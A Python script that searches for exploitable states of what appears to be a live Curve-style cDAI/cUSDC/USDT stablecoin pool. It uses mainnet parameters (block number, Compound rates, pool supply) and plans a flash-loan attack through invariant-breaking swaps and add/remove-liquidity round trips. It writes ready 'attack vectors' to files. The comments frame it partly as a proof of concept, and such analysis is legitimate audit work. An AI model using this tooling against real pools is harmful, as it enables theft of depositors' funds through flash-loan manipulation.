

from random import seed
from random import randint
from random import uniform
from datetime import datetime
import threading
import time

import price_calcs

import numpy as np

import solver

N_COINS = 3
PRECISION_MUL = [1, 1000000000000, 1000000000000]

FEE_DENOMINATOR = 10 ** 10
PRECISION = 10 ** 18

MAX_ADMIN_FEE = 10 * 10 ** 9
MAX_FEE = 5 * 10 ** 9

MAX_A = 10 ** 6
MAX_A_CHANGE = 10
A_PRECISION = 100
amp = 2000

ADMIN_ACTIONS_DELAY = 3 * 86400
MIN_RAMP_TIME = 86400


#Expression of the invariant of the USDT pool in the contract code
def USDTpool(xp, amp, D):
    '''
    Return f(D), takes xp in TokenPrecision units
    '''
    #amp is already A*n**(n-1)
    Ann = amp*N_COINS
    S = 0
    for _x in xp:
        S += _x
    if S == 0:
        return 0
    P = 1 #product of xi
    for _x in xp:
        P*= _x
    return Ann*S + (1-Ann)*D - (D**(N_COINS+1))/((N_COINS**N_COINS)*P)

#More sophisticated attack: 
# 1/ Find balances in the pool such that we find a D that doesn't satisfy the equality of the invariant
# 2/ Change the balances to this amount
# 3/ With these balances, try to swap an amount ~10% of the pool content
# 4/ If we get an effective price such that 1 token in gives > 1.05 tokens out, we found a solution
# 5/ Save the balances required to achieve that, save the profit
# 6/ For later: need to remove liquidity to pay back the flash loan so we'll need to code the remove_liquidity function to test it to the end but I think proving that we can swap with a broken spot price is enough

#Read by the attack contract from Compound
PRECISION_MUL = [1, 1000000000000, 1000000000000]

#Read from Etherscan for the USDT pool
fee = 4000000
admin_fee = 5000000000 

def TokensToCTokens(amount, index):
    return amount*PRECISION//(rates[index]//PRECISION_MUL[index])

def CTokensToTokens(amount, index):
    return amount*(rates[index]//PRECISION_MUL[index])//PRECISION

def CTokensToTokensIncreasedPrecision(amount, index):
    return rates[index] * amount// PRECISION

def TokensIncreasedPrecisionToCTokens(amount, index):
    return amount*PRECISION//rates[index]

denoms = [10**18, 10**6, 10**6]
tokenNames = ['DAI', 'USDC', 'USDT']
cTokenNames = ['cDAI', 'cUSDC', 'USDT']

def TokensToDollars(amount, index):
    return amount/denoms[index]
    
def CTokensToDollars(amount, index):
    return CTokensToTokens(amount,index)/denoms[index]
    
def DollarsToCTokens(amount, index):
    return TokensToCTokens(int(amount*denoms[index]),index)

def performSwap(i,j, amount_in_ctoken, attack_balances_c_tokens, current_ctokens):
    #Convert that in the corresponding amount of DAI using the rates function, same as in the _xp() fucntion
    amount_in_underlying = CTokensToTokens(amount_in_ctoken,i)
    #Check the amount of cUSDC calculated out for that amount in
    amount_out_ctokens = solver._exchange(i, j, attack_balances_c_tokens, amount_in_ctoken, rates, fee, amp)
    #Convert to the corresponding amount of USDC
    amount_out_underlying = CTokensToTokens(amount_out_ctokens,j)
    #If we get more than x% USDC for each DAI, save the amounts required for the attack and the discrepancy in effective price
    #print('swap')
    #print(TokensToDollars(amount_out_underlying,j))
    #print(TokensToDollars(amount_in_underlying,i))
    if TokensToDollars(amount_out_underlying,j) > 1.01*TokensToDollars(amount_in_underlying,i):
        print("Solution found!")
        file = open("D_based_attack_solutions.txt", "a")
        file.write("Iteration " + str(iteration) + "\n")
        file.write("Composition of the pool returning an invalid D in underlying: " + str(attack_balances_tokens_precision[0]//PRECISION) + " DAI, " + str(attack_balances_tokens_precision[1]//PRECISION) + " USDC, " + str(attack_balances_tokens_precision[2]//PRECISION) + " USDT\n")
        file.write("Composition of the pool returning an invalid D in cTokens: " + str(attack_balances_c_tokens[0]) + " cDAI, " + str(attack_balances_c_tokens[1]) + " cUSDC, " + str(attack_balances_c_tokens[2]) + " USDT\n")
        file.write("Invalid D: " + str(D) + "\n")
        file.write("U: " + str(u) + "\n")
        
        file.write("Amount of tokens to add: " + str(attack_balances_c_tokens[0]-current_ctokens[0]) + " cDAI, " + str(attack_balances_c_tokens[1]-current_ctokens[1]) +  " cUSDC, " + str(attack_balances_c_tokens[2]-current_ctokens[2]) + " USDT \n")
        file.write("Corresponding amount in dollars: " + str(CTokensToDollars(attack_balances_c_tokens[0]-current_ctokens[0],0)) + " $DAI, " + str(CTokensToDollars(attack_balances_c_tokens[1]-current_ctokens[1],1)) +  " $USDC, " + str(CTokensToDollars(attack_balances_c_tokens[2]-current_ctokens[2],2)) + " $USDT \n")
        
        file.write("Swap " + cTokenNames[i] + " for " + cTokenNames[j] + ". Amount to swap: " + str(amount_in_ctoken) + ' ' + cTokenNames[i] + "\n")
        file.write("Effective exchange rate :" + str(TokensToDollars(amount_out_underlying,j)/TokensToDollars(amount_in_underlying,i)) + "\n")
        
        file.write("attack Vector\n")
        file.write("attackAdd = [" + str(attack_balances_c_tokens[0]-current_ctokens[0]) + ", " + str(attack_balances_c_tokens[1]-current_ctokens[1]) + ", " + str(attack_balances_c_tokens[2]-current_ctokens[2]) + "]\n")
        file.write("i = "+ str(i) +'\n')
        file.write("j = "+ str(j) +'\n')
        file.write("amount = "+ str(amount_in_ctoken) +'\n')
        file.write("amountBack = "+ str(DollarsToCTokens(CTokensToDollars(amount_in_ctoken,i),j)) +'\n\n')
        
        print("...")
        file.close()

def AddRemoveLiquidityAttack(attack_balances_c_tokens,current_ctokens):
    attackAdd = [attack_balances_c_tokens[0]-current_ctokens[0], attack_balances_c_tokens[1]-current_ctokens[1], attack_balances_c_tokens[2]-current_ctokens[2]]
    
    #put liquidity
    (amounts,fees,D1,new_token_supply,mint_amount,new_balances) = solver.add_liquidity(attackAdd, totalSupply, current_ctokens,fee, rates, admin_fee, amp)

    #take away
    (self_balances,amounts,new_balances) = solver.remove_liquidity(mint_amount, [0,0,0], new_balances, new_token_supply)
    
    fundsIn = sum([CTokensToDollars(attackAdd[i],i) for i in range(N_COINS)])
    fundsOut = sum([CTokensToDollars(amounts[i],i) for i in range(N_COINS)])
    if(fundsOut > fundsIn*1.01):
        file = open("AddRemoveLiquidityAttack.txt", "a")
        file.write("Solution found! AddRemove\n")
        file.write("Add\n")
        file.write(str(attackAdd[0])+', '+str(attackAdd[1])+', '+str(attackAdd[2])+'\n')
        file.write("remove\n")
        file.write(str(mint_amount) +'\n')
        file.write("profit\n")
        file.write(str(fundsIn/fundsOut) + '\n')
        file.write('\n')
        file.close()

##########################
####MINING PARAMETERS#####
##########################

blockNumber = 11835041
current_ctokens = [ 2236520561601012 ,  3481287597858764 ,  200709219245 ]
LoanAmounts = [ 2000000000000000000000000 ,  2000000000000 ,  2000000000000 ]
funds_avail_ctokens = [ 9492175161208640 ,  9262735174877799 ,  2000000000000 ]
rates = [ 210699862363827219553716955 ,  215918944268682000000000000 ,  1000000000000000000000000000000 ]
totalSupply = 1339745924180340483387436 # total supply of pool tokens
##########################
##########################
##########################

#Funds available in DAI(18 decimals), USDC (6 decimals), USDT (6 decimals). Assume 100M of each. 
#funds_avail = [500000*10**18, 500000*10**6, 500000*10**6]
#funds_avail_ctokens = [TokensToCTokens(funds_avail[0],0), TokensToCTokens(funds_avail[1],1), TokensToCTokens(funds_avail[2],2)]#Funds available in DAI(18 decimals), USDC (6 decimals), USDT (6 decimals). Assume 100M of each. 

cdai = current_ctokens[0]
cusdc = current_ctokens[1]
usdt = current_ctokens[2]

seed(None)
print('Started iteration')
iteration = 0
while True: 
    #Create balances in TokensIncreasedPrecision with EQUAL AMOUNTS above what is currently in the pool
    fraction_to_add = uniform(0, 1)
    attack_balances_c_tokens = [cdai+int(funds_avail_ctokens[0]*fraction_to_add), cusdc+int(funds_avail_ctokens[1]*fraction_to_add), usdt+int(funds_avail_ctokens[2]*fraction_to_add)]
    attack_balances_tokens_precision = [CTokensToTokensIncreasedPrecision(attack_balances_c_tokens[0],0),
                                        CTokensToTokensIncreasedPrecision(attack_balances_c_tokens[1],1),
                                        CTokensToTokensIncreasedPrecision(attack_balances_c_tokens[2],2)]
    #print('aa')
    #print(attack_balances_c_tokens)
    #print(attack_balances_tokens_precision)
    #Get D for this pool composition
    D = solver.get_D(attack_balances_tokens_precision, amp)
    #Check if the D found breaks the invariant
    u = USDTpool(attack_balances_tokens_precision, amp, D)
    if abs(u) > 0:
        #file = open("invalidAnalysis.txt", "a")
        #file.write(str(attack_balances_tokens_precision[0])+','+str(attack_balances_tokens_precision[1])+','+str(attack_balances_tokens_precision[2])+','+str(D)+','+str(u) + '\n')
        #file.write("Invalid D found! \n")
        #file = open("invalidDs.txt", "a")
        #file.write("Iteration " + str(iteration) + "\n")
        #file.write("Invalid D found! \n")
        #file.write("Composition of the pool returning an invalid D in cTokens: " + str(attack_balances_c_tokens[0]) + " cDAI, " + str(attack_balances_c_tokens[1]) + " cUSDC, " + str(attack_balances_c_tokens[2]) + " USDT\n")
        #file.write("Invalid D: " + str(D) + "\n")
        #file.write("U: " + str(u) + "\n \n")
        #file.close()
        
        ##token swapping attack
        performSwap(0, 1, cdai // 10, attack_balances_c_tokens, current_ctokens) #DAI -> USDC test
        performSwap(1, 0, cusdc // 10, attack_balances_c_tokens, current_ctokens) #USDC -> DAI test
       
        performSwap(0, 2, cdai // 10, attack_balances_c_tokens, current_ctokens) #DAI -> USDT test
        performSwap(2, 0, usdt // 10, attack_balances_c_tokens, current_ctokens) #USDT -> DAI test
        
        performSwap(1, 2, cusdc // 10, attack_balances_c_tokens, current_ctokens) #USDC -> USDT test
        performSwap(2, 1, usdt // 10, attack_balances_c_tokens, current_ctokens) #USDT -> USDC test
        
        ##add & withdraw
        AddRemoveLiquidityAttack(attack_balances_c_tokens,current_ctokens)
     

    iteration += 1